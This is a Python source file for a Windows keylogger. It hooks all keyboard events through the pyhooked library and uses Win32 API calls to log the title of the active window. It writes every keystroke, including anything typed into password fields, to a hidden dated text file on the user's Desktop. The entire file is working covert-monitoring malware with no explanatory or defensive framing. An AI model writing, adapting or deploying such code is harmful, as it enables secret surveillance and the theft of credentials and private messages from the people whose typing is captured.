from pyhooked import Hook,KeyboardEvent
import sys
import os
import datetime
from ctypes import *

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
window_current = None

date = datetime.date.today()
file_name = date.strftime('%Y_%m_%d')

save_directory = '{0}//Desktop'.format(os.path.expanduser('~')) 
save_file = save_directory + '//' + '.' + file_name + '.txt'

input_key = []

def setting_keylogger():
    if not os.path.exists(save_directory):
        os.mkdir(save_directory)

def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    window_title = create_string_buffer(512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    return window_title.value.decode('cp932', 'ignore')

def event(args):
    global window_current
    if isinstance(args,KeyboardEvent):
        if 'down' in args.event_type:
            now_window = get_current_process()
            if window_current != now_window:
                    input_key.append(now_window+"\n")
                    window_current = now_window
            if args.current_key not in ['Left','Up','Right','Down']:
                input_key.append(args.current_key)
            if 'Return' == args.current_key:
                with open(save_file,'a') as f:
                    f.write(''.join(input_key)+'\n')
                input_key.clear()

setting_keylogger()
window_current = get_current_process()
hook = Hook()
hook.handler = event
hook.hook()
